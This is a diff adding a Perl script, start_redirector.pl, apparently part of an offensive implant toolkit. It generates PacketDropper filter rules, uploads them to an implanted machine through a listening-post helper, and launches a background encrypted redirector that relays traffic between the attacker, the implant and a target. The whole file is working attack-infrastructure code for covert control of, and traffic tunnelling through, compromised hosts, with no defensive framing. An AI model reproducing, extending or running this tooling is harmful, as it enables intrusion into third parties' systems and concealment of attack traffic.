@@ -1,0 +1,201 @@
+#! /usr/bin/env perl
+use Getopt::Long;
+
+sub usage{
+
+  print "\n\nstart_redirector.pl creates and uploads PacketDropper filter files and/or starts a local listener to perform encryption and redirection.\n\n";
+  
+  print "Usage: start_redirector.pl --lp <LP ip> --implant <Impant ip> --idkey <Implant key file>\n";
+  print "       [--lptimeout <lp timeout>] [--bsize <benign size>] --cmd <command number> --local_ip <ip>\n";
+  print "       --clr_tunnel_ip <ip> --enc_tunnel_ip <ip> --orig_src_ip <ip> --enc_redir_ip <ip> --clr_redir_ip <ip>\n";
+  print "       --target_ip <ip> --enc_tunnel_pt <port> --enc_redir_pt <port>\n";
+  print "       --enc_iface <interface number> --clr_iface <interface number>\n";
+  print "       --enc_key <encryption key file> [--proto <protocol>] [--redir_to_target_dest_pt <port>]\n";
+  print "       [--redir_to_target_src_pt <port>] [--target_to_redir_dest_pt <port>]\n";
+  print "       [--target_to_redir_src_pt <port>] [--tunnel_to_attacker_dest_pt <port>]\n";
+  print "       [--tunnel_to_attacker_src_pt <port>] [--restart] --timeout <seconds> [--logdir <logdir>]\n\n";
+
+
+  print "   --lp <LP ip>\n";
+  print "       IP Address of the LP box\n\n";
+  print "   --implant <Impant ip>\n";
+  print "       IP Address of the Implanted box\n\n";
+  print "   --idkey <Implant key file>\n";
+  print "       File containing key information for the implant\n\n";
+  print "  [--lptimeout <lp timeout>]\n";
+  print "       The amount of time (in seconds) the LP should wait for a response\n\n";
+  print "  [--bsize <benign size>]\n";
+  print "       (Optional) The max packet size for packets traveling between the LP and implant\n\n";
+  print "   --cmd <command number>\n";
+  print "       The command number of the PD_addRuleHandler in hex\n\n";
+  print "   --local_ip <ip>\n";
+  print "       IP address of this machine\n\n";
+  print "   --clr_tunnel_ip <ip>\n";
+  print "       IP address that packets will be sent to for encryption and redirection\n\n";
+  print "   --enc_tunnel_ip <ip>\n";
+  print "       Source IP address of encrypted packets going to the redirector\n\n";
+  print "   --enc_redir_ip <ip>\n";
+  print "       IP address of the encrypted interface on the redirector box\n\n";
+  print "   --orig_src_ip <op>\n";
+  print "       Original source address of the unencrypted attacker packet when\n";
+  print "       it is generated\n\n";
+  print "   --clr_redir_ip <ip>\n";
+  print "       IP address of the clear interface on the redirector box\n\n";
+  print "   --target_ip <ip>\n";
+  print "       IP address of the target box\n\n";
+  print "   --enc_tunnel_pt <port>\n";
+  print "       Local port used to send and recieve encrypted packets\n\n";
+  print "   --enc_redir_pt <port>\n";
+  print "       Remote port used to send and recieve encrypted packets\n\n";
+  print "   --enc_iface <interface number>\n";
+  print "       Interface number of the encrypted interface on the redirector\n\n";
+  print "   --clr_iface <interface number>\n";
+  print "       Interface number of the clear interfac on the redirector\n\n";
+  print "   --enc_key <encryption key file>\n";
+  print "       File containing the encryption key to be used (if file does not exist,\n";
+  print "       it will be created and a key will be generated\n\n";
+  print "  [--proto <protocol>]\n";
+  print "       (Optional) Protocol to encrypt and redirect. If no protocol is specified\n";
+  print "       all protocols will be ecnrypted and redirected.  Specified protocol must\n";
+  print "       be recognizable to a Berkley Packet Filter parser\n\n";
+  print "  [--redir_to_target_dest_pt <port>]\n";
+  print "       (Optional) Destination port of packets sent from the clear interface on\n";
+  print "        the redirector to the target box\n\n";
+  print "  [--redir_to_target_src_pt <port>]\n";
+  print "       (Optional) Source port of packets sent from the clear interface on\n";
+  print "        the redirector to the target box\n\n";
+  print "  [--target_to_redir_dest_pt <port>]\n";
+  print "       (Optional) Destination port of packets sent from the target box to\n";
+  print "       the clear interface of the redirector\n\n";
+  print "  [--target_to_redir_src_pt <port>]\n";
+  print "       (Optional) Source port of packets sent from the target box to\n";
+  print "       the clear interface of the redirector\n\n";
+  print "  [--tunnel_to_attacker_dest_pt <port>]\n";
+  print "       (Optional) Destination port of packets sent from the local listener to\n";
+  print "       attacker\n\n";
+  print "  [--tunnel_to_attacker_src_pt <port>]\n";
+  print "       (Optional) Source port of packets sent from the local listener to\n";
+  print "       attacker\n\n";
+  print "  [--restart]\n";
+  print "       (Optional) Use this option to only start the local listener without\n";
+  print "       creating and uploading filter files\n\n";
+  print "  --timeout <seconds>\n";
+  print "       The amount of time, in seconds, the encrypted redirector will sit idle\n";
+  print "       before timing out\n\n";
+  print "  [--logdir <logdir>]\n";
+  print "       (Optional) directory to save logs to (defaults to .)\n";
+
+}
+
+GetOptions("lp=s", "implant=s", "idkey=s", "sport=s", "dport=s", "lptimeout=s", "bsize=s", "cmd=s", "clr_tunnel_ip=s", "enc_tunnel_ip=s", "enc_redir_ip=s", "clr_redir_ip=s", 
+           "target_ip=s", "enc_tunnel_pt=s", "enc_redir_pt=s", "enc_iface=s", "enc_key=s", "clr_iface=s", "proto=s", "redir_to_target_dest_pt=s", "timeout=s",
+           "redir_to_target_src_pt=s", "target_to_redir_dest_pt=s", "target_to_redir_src_pt=s", "tunnel_to_attacker_dest_pt=s", "tunnel_to_attacker_src_pt=s",
+           "orig_src_ip=s", "local_ip=s", "restart", "logdir=s");
+
+
+if(!defined($opt_lp) || !defined($opt_implant) || !defined($opt_sport) || !defined($opt_dport) || !defined($opt_cmd) || !defined($opt_clr_tunnel_ip) 
+|| !defined($opt_enc_tunnel_ip) || !defined($opt_enc_redir_ip) || !defined($opt_clr_redir_ip) || !defined($opt_target_ip) || !defined($opt_enc_tunnel_pt)
+|| !defined($opt_enc_redir_pt) || !defined($opt_enc_key) || !defined($opt_enc_iface) || !defined($opt_clr_iface) || !defined($opt_timeout) || !defined($opt_orig_src_ip)
+|| !defined($opt_local_ip))
+{
+
+  if(!defined($opt_restart)){ 
+    usage(); 
+    die;
+  }
+  else{
+    if(!defined($opt_sport) || !defined($opt_dport) || !defined($opt_clr_tunnel_ip) 
+    || !defined($opt_enc_tunnel_ip) || !defined($opt_enc_redir_ip) || !defined($opt_clr_redir_ip) || !defined($opt_target_ip) || !defined($opt_enc_tunnel_pt)
+    || !defined($opt_enc_redir_pt) || !defined($opt_enc_key)){ 
+      usage(); 
+      die;
+    }
+  }
+
+}
+
+
+system("./stop_redirector.sh-2100");
+sleep(1);
+open(KEY, "<", $opt_enc_key) or system("./keygen $opt_enc_key");
+open(KEY, "<", $opt_enc_key) or die "Could not open or create keyfile\n";
+
+read(KEY, $key, 64);
+
+close(KEY);
+
+if(!defined($opt_restart)){
+
+  ($sec,$min,$hour,$day,$month,$year) = localtime(time);
+
+  $enc_filt_filename = sprintf("%s/%s/encrypted_redirector_filter_%04d%02d%02d_%02d%02d%02d", $opt_logdir, $opt_implant, $year, $day, $month,$hour, $min, $sec );
+
+  open(ENC_FILT, ">", $enc_filt_filename) or system("mkdir $opt_implant");
+  open(ENC_FILT, ">", $enc_filt_filename) or die "Could not create encrypt filter file\n";
+
+
+
+  printf(ENC_FILT "1 %s %s 4 %s %s %s %s %s %s ", ($opt_clr_iface), $opt_timeout, $opt_enc_tunnel_ip, $opt_enc_tunnel_pt, $opt_enc_redir_ip, $opt_enc_redir_pt, ($opt_enc_iface), $key );
+  printf(ENC_FILT "src host %s ", $opt_target_ip);
+  if(defined($opt_target_to_redir_src_pt))  { printf(ENC_FILT "and src port %s ", $opt_target_to_redir_src_pt); }
+  if(defined($opt_target_to_redir_dest_pt)) { printf(ENC_FILT "and dst port %s ", $opt_target_to_redir_dest_pt); }
+  if(defined($opt_proto))                   { printf(ENC_FILT "and %s", $opt_proto ); }
+
+  printf(ENC_FILT "\n2 %s %s 5 %s %s %s src host %s and src port %s and dst port %s and udp", ($opt_enc_iface), $opt_timeout, $opt_target_ip, ($opt_clr_iface), $key, $opt_enc_tunnel_ip, 
+          $opt_enc_tunnel_pt, $opt_enc_redir_pt);
+
+  close(ENC_FILT);
+
+
+  $pd_mprog = sprintf("./pd_miniprog-2100 --lp %s --implant %s --idkey %s --sport %s --dport %s ", 
+                          $opt_lp, $opt_implant, $opt_idkey, $opt_sport, $opt_dport,);
+
+  if(defined($opt_lptimeout)){
+    $pd_mprog = sprintf("%s --lptimeout %s", $pd_mprog, $opt_lptimeout);
+  }
+
+  if(defined($opt_bsize)){
+    $pd_mprog = sprintf("%s --bsize %s", $pd_mprog, $opt_bsize);
+  }
+
+  if(defined($opt_logdir)){
+    $pd_mprog = sprintf("%s --logdir %s", $pd_mprog, $opt_logdir);
+  }
+
+  print  "$pd_mprog  --cmd $opt_cmd --name add_rule --arg $enc_filt_filename\n";
+  system("$pd_mprog  --cmd $opt_cmd --name add_rule --arg $enc_filt_filename"); 
+
+
+  sleep(3);
+}
+
+$bg_redirect = sprintf("./bg_redirect.pl-2100 --clr_tunnel_ip %s --enc_tunnel_ip %s --enc_redir_ip %s --orig_src_ip %s --clr_redir_ip %s --target_ip %s --enc_tunnel_pt %s --enc_redir_pt %s --enc_key %s --local_ip %s", 
+                        $opt_clr_tunnel_ip, $opt_enc_tunnel_ip, $opt_enc_redir_ip, $opt_orig_src_ip , $opt_clr_redir_ip , $opt_target_ip, $opt_enc_tunnel_pt, $opt_enc_redir_pt, 
+                        $opt_enc_key, $opt_local_ip);
+
+if(defined($opt_redir_to_target_src_pt)){
+  $bg_redirect = sprintf("$bg_redirect --redir_to_target_src_pt %s", $opt_redir_to_target_src_pt)
+}
+
+if(defined($opt_redir_to_target_dest_pt)){
+  $bg_redirect = sprintf("$bg_redirect --redir_to_target_dest_pt %s", $opt_redir_to_target_dest_pt)
+}
+
+if(defined($opt_tunnel_to_attacker_src_pt)){
+  $bg_redirect = sprintf("$bg_redirect --tunnel_to_attacker_src_pt %s", $opt_tunnel_to_attacker_src_pt)
+}
+
+if(defined($opt_tunnel_to_attacker_dest_pt)){
+  $bg_redirect = sprintf("$bg_redirect --tunnel_to_attacker_dest_pt %s", $opt_tunnel_to_attacker_dest_pt)
+}
+
+if(defined($opt_proto)){
+  $bg_redirect = sprintf("$bg_redirect --proto %s", $opt_proto)
+}
+
+$bg_redirect = sprintf("$bg_redirect &"); 
+print  "$bg_redirect\n";
+system("$bg_redirect");
+
+print "done\n";
+
